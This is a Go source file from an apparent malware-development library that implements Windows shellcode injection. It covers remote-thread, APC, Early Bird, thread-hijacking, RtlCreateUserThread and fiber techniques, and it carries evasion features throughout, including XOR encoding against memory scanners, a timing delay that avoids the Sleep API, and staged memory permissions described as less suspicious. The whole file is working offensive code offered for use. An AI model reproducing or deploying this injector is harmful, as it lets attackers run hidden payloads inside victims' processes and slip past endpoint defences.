//go:build windows

package inject

import (
	"crypto/rand"
	"fmt"
	"math/big"
	"unsafe"

	"github.com/oioio-space/maldev/win/api"
	wsyscall "github.com/oioio-space/maldev/win/syscall"
	"golang.org/x/sys/windows"
)

// Windows injection constants
const (
	threadAllAccess = 0x1FFFFF // THREAD_ALL_ACCESS

	threadWaitTimeout          = 2000
	cpuDelayMaxIterations      = 5000000
	cpuDelayFallbackIterations = 3000000

	contextFull = 0x10001F // CONTEXT_FULL (x64)
)

// context64 is a local alias for api.Context64 (x64 thread context).
type context64 = api.Context64

// windowsInjector implements injection for Windows.
type windowsInjector struct {
	config *Config
}

func validateShellcode(shellcode []byte) error {
	if len(shellcode) == 0 {
		return fmt.Errorf("shellcode is empty")
	}
	return nil
}

func xorEncodeShellcode(shellcode []byte) (encoded []byte, key byte, err error) {
	xorKey := make([]byte, 1)
	_, err = rand.Read(xorKey)
	if err != nil {
		return nil, 0, fmt.Errorf("failed to generate XOR key: %w", err)
	}
	key = xorKey[0]

	encoded = make([]byte, len(shellcode))
	copy(encoded, shellcode)
	for i := range encoded {
		encoded[i] ^= key
	}

	return encoded, key, nil
}

func xorDecodeInPlace(addr uintptr, size int, key byte) {
	for i := 0; i < size; i++ {
		ptr := (*byte)(unsafe.Pointer(addr + uintptr(i)))
		*ptr ^= key
	}
}

func cpuDelay() {
	iterations, err := rand.Int(rand.Reader, big.NewInt(cpuDelayMaxIterations))
	if err != nil {
		iterations = big.NewInt(cpuDelayFallbackIterations)
	}
	limit := iterations.Int64()

	var counter int64
	for counter < limit {
		counter++
		_ = counter * 2
	}
}

func newPlatformInjector(cfg *Config) (Injector, error) {
	if cfg == nil {
		return nil, fmt.Errorf("config is nil")
	}
	return &windowsInjector{config: cfg}, nil
}

func (w *windowsInjector) Inject(shellcode []byte) error {
	switch w.config.Method {
	case MethodCreateRemoteThread:
		return w.injectCreateRemoteThread(shellcode)
	case MethodCreateThread:
		return w.injectCreateThread(shellcode)
	case MethodQueueUserAPC:
		return w.injectQueueUserAPC(shellcode)
	case MethodEarlyBirdAPC:
		return w.injectEarlyBird(shellcode)
	case MethodThreadHijack:
		return w.injectThreadHijack(shellcode)
	case MethodRtlCreateUserThread:
		return w.injectRtlCreateUserThread(shellcode)
	case MethodDirectSyscall:
		return w.injectDirectSyscall(shellcode)
	case MethodCreateFiber:
		return w.injectCreateFiber(shellcode)
	default:
		return fmt.Errorf("unknown injection method: %s", w.config.Method)
	}
}

// --- Method 1: CreateRemoteThread ---

func (w *windowsInjector) injectCreateRemoteThread(shellcode []byte) error {
	if err := validateShellcode(shellcode); err != nil {
		return err
	}
	if w.config.PID == 0 {
		return fmt.Errorf("PID required for CreateRemoteThread")
	}

	hProcess, err := windows.OpenProcess(
		windows.PROCESS_CREATE_THREAD|
			windows.PROCESS_QUERY_INFORMATION|
			windows.PROCESS_VM_OPERATION|
			windows.PROCESS_VM_WRITE|
			windows.PROCESS_VM_READ,
		false,
		uint32(w.config.PID),
	)
	if err != nil {
		return fmt.Errorf("OpenProcess failed: %w", err)
	}
	defer windows.CloseHandle(hProcess)

	addr, err := allocateAndWriteMemoryRemote(hProcess, shellcode)
	if err != nil {
		return fmt.Errorf("remote memory setup failed: %w", err)
	}

	hThread, _, err := api.ProcCreateRemoteThread.Call(
		uintptr(hProcess),
		0, 0,
		addr,
		0, 0, 0,
	)
	if hThread == 0 {
		return fmt.Errorf("CreateRemoteThread failed: %w", err)
	}
	windows.CloseHandle(windows.Handle(hThread))

	return nil
}

// --- Method 2: CreateThread (self, with evasion) ---

func (w *windowsInjector) injectCreateThread(shellcode []byte) error {
	if err := validateShellcode(shellcode); err != nil {
		return err
	}

	// 1. XOR encode shellcode (memory scan evasion)
	encoded, key, err := xorEncodeShellcode(shellcode)
	if err != nil {
		return fmt.Errorf("XOR encoding failed: %w", err)
	}

	// 2. Allocate with PAGE_READWRITE (less suspicious)
	addr, err := windows.VirtualAlloc(
		0,
		uintptr(len(encoded)),
		windows.MEM_COMMIT|windows.MEM_RESERVE,
		windows.PAGE_READWRITE,
	)
	if err != nil {
		return fmt.Errorf("VirtualAlloc failed: %w", err)
	}

	// 3. Copy encoded shellcode
	api.ProcRtlMoveMemory.Call(
		addr,
		uintptr(unsafe.Pointer(&encoded[0])),
		uintptr(len(encoded)),
	)

	// 4. CPU delay (temporal evasion, avoids Sleep API)
	cpuDelay()

	// 5. Decode shellcode in place
	xorDecodeInPlace(addr, len(encoded), key)

	// 6. Change permissions to PAGE_EXECUTE_READ
	var oldProtect uint32
	err = windows.VirtualProtect(
		addr,
		uintptr(len(encoded)),
		windows.PAGE_EXECUTE_READ,
		&oldProtect,
	)
	if err != nil {
		return fmt.Errorf("VirtualProtect failed: %w", err)
	}

	// 7. Create thread with NtCreateThreadEx (stealthier than CreateThread)
	var hThread uintptr
	currentProcess := ^uintptr(0) // -1 in uintptr

	status, _, _ := api.ProcNtCreateThreadEx.Call(
		uintptr(unsafe.Pointer(&hThread)),
		threadAllAccess,
		0,
		currentProcess,
		addr,
		0,
		0, 0, 0, 0, 0,
	)
	if status != 0 {
		return fmt.Errorf("NtCreateThreadEx failed: status 0x%X", status)
	}

	// 8. Wait briefly for thread to start (100ms)
	api.ProcWaitForSingleObject.Call(hThread, 100)
	windows.CloseHandle(windows.Handle(hThread))

	return nil
}

// --- Method 3: QueueUserAPC ---

func (w *windowsInjector) injectQueueUserAPC(shellcode []byte) error {
	if err := validateShellcode(shellcode); err != nil {
		return err
	}
	if w.config.PID == 0 {
		return fmt.Errorf("PID required for QueueUserAPC")
	}

	hProcess, err := windows.OpenProcess(
		windows.PROCESS_VM_OPERATION|
			windows.PROCESS_VM_WRITE|
			windows.PROCESS_VM_READ,
		false,
		uint32(w.config.PID),
	)
	if err != nil {
		return fmt.Errorf("OpenProcess failed: %w", err)
	}
	defer windows.CloseHandle(hProcess)

	addr, err := allocateAndWriteMemoryRemote(hProcess, shellcode)
	if err != nil {
		return fmt.Errorf("remote memory setup failed: %w", err)
	}

	// Find all threads of the target process
	threadIDs, err := findAllThreads(w.config.PID)
	if err != nil {
		return fmt.Errorf("failed to find threads: %w", err)
	}
	if len(threadIDs) == 0 {
		return fmt.Errorf("no threads found for PID %d", w.config.PID)
	}

	success := false
	for _, threadID := range threadIDs {
		hThread, err := windows.OpenThread(
			windows.THREAD_SET_CONTEXT|windows.THREAD_SUSPEND_RESUME,
			false,
			threadID,
		)
		if err != nil {
			continue
		}

		count, _, _ := api.ProcSuspendThread.Call(uintptr(hThread))

		apcRet, _, _ := api.ProcQueueUserAPC.Call(addr, uintptr(hThread), 0)

		windows.ResumeThread(hThread)

		windows.CloseHandle(hThread)

		if apcRet != 0 && count != 0xFFFFFFFF {
			success = true
			break
		}
	}

	if !success {
		return fmt.Errorf("failed to queue APC on any thread")
	}

	return nil
}

// --- Method 4: Early Bird APC ---

func (w *windowsInjector) injectEarlyBird(shellcode []byte) error {
	if err := validateShellcode(shellcode); err != nil {
		return err
	}

	processPath := w.config.ProcessPath
	if processPath == "" {
		processPath = `C:\Windows\System32\notepad.exe`
	}

	var si windows.StartupInfo
	var pi windows.ProcessInformation
	si.Cb = uint32(unsafe.Sizeof(si))

	cmdLine, err := windows.UTF16PtrFromString(processPath)
	if err != nil {
		return fmt.Errorf("UTF16PtrFromString failed: %w", err)
	}

	err = windows.CreateProcess(
		nil, cmdLine, nil, nil, false,
		windows.CREATE_SUSPENDED,
		nil, nil, &si, &pi,
	)
	if err != nil {
		return fmt.Errorf("CreateProcess failed: %w", err)
	}
	defer windows.CloseHandle(pi.Process)
	defer windows.CloseHandle(pi.Thread)

	addr, err := allocateAndWriteMemoryRemote(pi.Process, shellcode)
	if err != nil {
		windows.TerminateProcess(pi.Process, 1)
		return fmt.Errorf("remote memory setup failed: %w", err)
	}

	apcRet, _, _ := api.ProcQueueUserAPC.Call(
		addr,
		uintptr(pi.Thread),
		0,
	)
	if apcRet == 0 {
		windows.TerminateProcess(pi.Process, 1)
		return fmt.Errorf("QueueUserAPC failed")
	}

	_, err = windows.ResumeThread(pi.Thread)
	if err != nil {
		windows.TerminateProcess(pi.Process, 1)
		return fmt.Errorf("ResumeThread failed: %w", err)
	}

	return nil
}

// --- Method 5: Thread Execution Hijacking (T1055.003) ---

func (w *windowsInjector) injectThreadHijack(shellcode []byte) error {
	if err := validateShellcode(shellcode); err != nil {
		return err
	}

	processPath := w.config.ProcessPath
	if processPath == "" {
		processPath = `C:\Windows\System32\notepad.exe`
	}

	var si windows.StartupInfo
	var pi windows.ProcessInformation
	si.Cb = uint32(unsafe.Sizeof(si))

	cmdLine, err := windows.UTF16PtrFromString(processPath)
	if err != nil {
		return fmt.Errorf("UTF16PtrFromString failed: %w", err)
	}

	err = windows.CreateProcess(
		nil, cmdLine, nil, nil, false,
		windows.CREATE_SUSPENDED,
		nil, nil, &si, &pi,
	)
	if err != nil {
		return fmt.Errorf("CreateProcess failed: %w", err)
	}
	defer windows.CloseHandle(pi.Process)
	defer windows.CloseHandle(pi.Thread)

	addr, err := allocateAndWriteMemoryRemote(pi.Process, shellcode)
	if err != nil {
		windows.TerminateProcess(pi.Process, 1)
		return fmt.Errorf("remote memory setup failed: %w", err)
	}

	var ctx context64
	ctx.ContextFlags = contextFull

	retGet, _, _ := api.ProcGetThreadContext.Call(uintptr(pi.Thread), uintptr(unsafe.Pointer(&ctx)))
	if retGet == 0 {
		windows.TerminateProcess(pi.Process, 1)
		return fmt.Errorf("GetThreadContext failed")
	}

	ctx.Rip = uint64(addr)

	retSet, _, _ := api.ProcSetThreadContext.Call(uintptr(pi.Thread), uintptr(unsafe.Pointer(&ctx)))
	if retSet == 0 {
		windows.TerminateProcess(pi.Process, 1)
		return fmt.Errorf("SetThreadContext failed")
	}

	windows.ResumeThread(pi.Thread)

	return nil
}

// --- Method 6: RtlCreateUserThread ---

func (w *windowsInjector) injectRtlCreateUserThread(shellcode []byte) error {
	if err := validateShellcode(shellcode); err != nil {
		return err
	}
	if w.config.PID == 0 {
		return fmt.Errorf("PID required for RtlCreateUserThread")
	}

	hProcess, err := windows.OpenProcess(
		windows.PROCESS_VM_OPERATION|
			windows.PROCESS_VM_WRITE|
			windows.PROCESS_VM_READ|
			windows.PROCESS_CREATE_THREAD,
		false,
		uint32(w.config.PID),
	)
	if err != nil {
		return fmt.Errorf("OpenProcess failed: %w", err)
	}
	defer windows.CloseHandle(hProcess)

	addr, err := allocateAndWriteMemoryRemote(hProcess, shellcode)
	if err != nil {
		return fmt.Errorf("remote memory setup failed: %w", err)
	}

	var hThread uintptr
	status, _, _ := api.ProcRtlCreateUserThread.Call(
		uintptr(hProcess),
		0,    // SecurityDescriptor
		0,    // CreateSuspended = FALSE
		0,    // StackZeroBits
		0,    // StackReserve
		0,    // StackCommit
		addr, // StartAddress
		0,    // Parameter
		uintptr(unsafe.Pointer(&hThread)),
		0, // ClientId
	)

	if status != 0 {
		return fmt.Errorf("RtlCreateUserThread failed: NTSTATUS 0x%X", status)
	}

	windows.CloseHandle(windows.Handle(hThread))
	return nil
}

// --- Method 7: Direct Syscall ---

func (w *windowsInjector) injectDirectSyscall(shellcode []byte) error {
	return fmt.Errorf("legacy direct syscall path removed: use NewWindowsInjector with SyscallMethod: wsyscall.MethodDirect")
}

// --- Method 8: CreateFiber ---

func (w *windowsInjector) injectCreateFiber(shellcode []byte) error {
	if err := validateShellcode(shellcode); err != nil {
		return err
	}

	// 1. Allocate and prepare memory (RW -> Copy -> RX)
	addr, err := allocateAndWriteMemoryLocal(shellcode)
	if err != nil {
		return fmt.Errorf("memory allocation failed: %w", err)
	}

	// 2. Convert current thread to Fiber
	mainFiber, _, err := api.ProcConvertThreadToFiber.Call(0)
	if mainFiber == 0 {
		return fmt.Errorf("ConvertThreadToFiber failed: %w", err)
	}

	// 3. Create a Fiber with shellcode as start function
	shellcodeFiber, _, err := api.ProcCreateFiber.Call(0, addr, 0)
	if shellcodeFiber == 0 {
		return fmt.Errorf("CreateFiber failed: %w", err)
	}

	// 4. Switch to shellcode Fiber (execution!)
	api.ProcSwitchToFiber.Call(shellcodeFiber)

	return nil
}

// --- Helper functions ---

func findAllThreads(pid int) ([]uint32, error) {
	snapshot, err := windows.CreateToolhelp32Snapshot(windows.TH32CS_SNAPTHREAD, 0)
	if err != nil {
		return nil, err
	}
	defer windows.CloseHandle(snapshot)

	var te windows.ThreadEntry32
	te.Size = uint32(unsafe.Sizeof(te))

	if err := windows.Thread32First(snapshot, &te); err != nil {
		return nil, err
	}

	var threads []uint32
	for {
		if te.OwnerProcessID == uint32(pid) {
			threads = append(threads, te.ThreadID)
		}
		if err := windows.Thread32Next(snapshot, &te); err != nil {
			break
		}
	}

	return threads, nil
}

func allocateAndWriteMemoryLocal(shellcode []byte) (uintptr, error) {
	// 1. Allocate with PAGE_READWRITE
	addr, err := windows.VirtualAlloc(
		0,
		uintptr(len(shellcode)),
		windows.MEM_COMMIT|windows.MEM_RESERVE,
		windows.PAGE_READWRITE,
	)
	if err != nil {
		return 0, fmt.Errorf("VirtualAlloc failed: %w", err)
	}

	// 2. Copy shellcode (RtlMoveMemory is void — no return value check)
	api.ProcRtlMoveMemory.Call(
		addr,
		uintptr(unsafe.Pointer(&shellcode[0])),
		uintptr(len(shellcode)),
	)

	// 3. Change permissions to PAGE_EXECUTE_READ
	var oldProtect uint32
	err = windows.VirtualProtect(
		addr,
		uintptr(len(shellcode)),
		windows.PAGE_EXECUTE_READ,
		&oldProtect,
	)
	if err != nil {
		return 0, fmt.Errorf("VirtualProtect failed: %w", err)
	}

	return addr, nil
}

func allocateAndWriteMemoryRemote(hProcess windows.Handle, shellcode []byte) (uintptr, error) {
	// 1. Allocate with PAGE_READWRITE
	addr, _, err := api.ProcVirtualAllocEx.Call(
		uintptr(hProcess),
		0,
		uintptr(len(shellcode)),
		windows.MEM_COMMIT|windows.MEM_RESERVE,
		windows.PAGE_READWRITE,
	)
	if addr == 0 {
		return 0, fmt.Errorf("VirtualAllocEx failed: %w", err)
	}

	// 2. Write shellcode
	err = windows.WriteProcessMemory(
		hProcess,
		addr,
		&shellcode[0],
		uintptr(len(shellcode)),
		nil,
	)
	if err != nil {
		return 0, fmt.Errorf("WriteProcessMemory failed: %w", err)
	}

	// 3. Change permissions to PAGE_EXECUTE_READ
	var oldProtect uint32
	err = windows.VirtualProtectEx(
		hProcess,
		addr,
		uintptr(len(shellcode)),
		windows.PAGE_EXECUTE_READ,
		&oldProtect,
	)
	if err != nil {
		return 0, fmt.Errorf("VirtualProtectEx failed: %w", err)
	}

	return addr, nil
}

// --- Caller-aware helpers (used by windowsSyscallInjector) ---

// allocateAndWriteMemoryRemoteWithCaller uses NT syscalls via the Caller to
// allocate, write, and protect remote process memory. If caller is nil it
// falls back to allocateAndWriteMemoryRemote.
func allocateAndWriteMemoryRemoteWithCaller(hProcess windows.Handle, shellcode []byte, caller *wsyscall.Caller) (uintptr, error) {
	if caller == nil {
		return allocateAndWriteMemoryRemote(hProcess, shellcode)
	}

	// 1. NtAllocateVirtualMemory (remote)
	var baseAddr uintptr
	regionSize := uintptr(len(shellcode))

	r, err := caller.Call("NtAllocateVirtualMemory",
		uintptr(hProcess),
		uintptr(unsafe.Pointer(&baseAddr)),
		0,
		uintptr(unsafe.Pointer(&regionSize)),
		windows.MEM_COMMIT|windows.MEM_RESERVE,
		windows.PAGE_READWRITE,
	)
	if r != 0 {
		return 0, fmt.Errorf("NtAllocateVirtualMemory: NTSTATUS 0x%X: %w", uint32(r), err)
	}

	// 2. NtWriteVirtualMemory
	var bytesWritten uintptr
	r, err = caller.Call("NtWriteVirtualMemory",
		uintptr(hProcess),
		baseAddr,
		uintptr(unsafe.Pointer(&shellcode[0])),
		uintptr(len(shellcode)),
		uintptr(unsafe.Pointer(&bytesWritten)),
	)
	if r != 0 {
		return 0, fmt.Errorf("NtWriteVirtualMemory: NTSTATUS 0x%X: %w", uint32(r), err)
	}

	// 3. NtProtectVirtualMemory -> PAGE_EXECUTE_READ
	var oldProtect uint32
	protectAddr := baseAddr
	protectSize := uintptr(len(shellcode))

	r, err = caller.Call("NtProtectVirtualMemory",
		uintptr(hProcess),
		uintptr(unsafe.Pointer(&protectAddr)),
		uintptr(unsafe.Pointer(&protectSize)),
		uintptr(windows.PAGE_EXECUTE_READ),
		uintptr(unsafe.Pointer(&oldProtect)),
	)
	if r != 0 {
		return 0, fmt.Errorf("NtProtectVirtualMemory: NTSTATUS 0x%X: %w", uint32(r), err)
	}

	return baseAddr, nil
}

// allocateAndWriteMemoryLocalWithCaller uses NT syscalls via the Caller to
// allocate, write, and protect local (current process) memory.
// If caller is nil it falls back to allocateAndWriteMemoryLocal.
func allocateAndWriteMemoryLocalWithCaller(shellcode []byte, caller *wsyscall.Caller) (uintptr, error) {
	if caller == nil {
		return allocateAndWriteMemoryLocal(shellcode)
	}

	currentProcess := uintptr(0xFFFFFFFFFFFFFFFF) // pseudo-handle

	// 1. NtAllocateVirtualMemory (PAGE_READWRITE)
	var baseAddr uintptr
	regionSize := uintptr(len(shellcode))

	r, err := caller.Call("NtAllocateVirtualMemory",
		currentProcess,
		uintptr(unsafe.Pointer(&baseAddr)),
		0,
		uintptr(unsafe.Pointer(&regionSize)),
		windows.MEM_COMMIT|windows.MEM_RESERVE,
		windows.PAGE_READWRITE,
	)
	if r != 0 {
		return 0, fmt.Errorf("NtAllocateVirtualMemory: NTSTATUS 0x%X: %w", uint32(r), err)
	}

	// 2. Copy shellcode (direct memory write - we own the process)
	for i, b := range shellcode {
		*(*byte)(unsafe.Pointer(baseAddr + uintptr(i))) = b
	}

	// 3. NtProtectVirtualMemory -> PAGE_EXECUTE_READ
	var oldProtect uint32
	protectAddr := baseAddr
	protectSize := uintptr(len(shellcode))

	r, err = caller.Call("NtProtectVirtualMemory",
		currentProcess,
		uintptr(unsafe.Pointer(&protectAddr)),
		uintptr(unsafe.Pointer(&protectSize)),
		uintptr(windows.PAGE_EXECUTE_READ),
		uintptr(unsafe.Pointer(&oldProtect)),
	)
	if r != 0 {
		return 0, fmt.Errorf("NtProtectVirtualMemory: NTSTATUS 0x%X: %w", uint32(r), err)
	}

	return baseAddr, nil
}
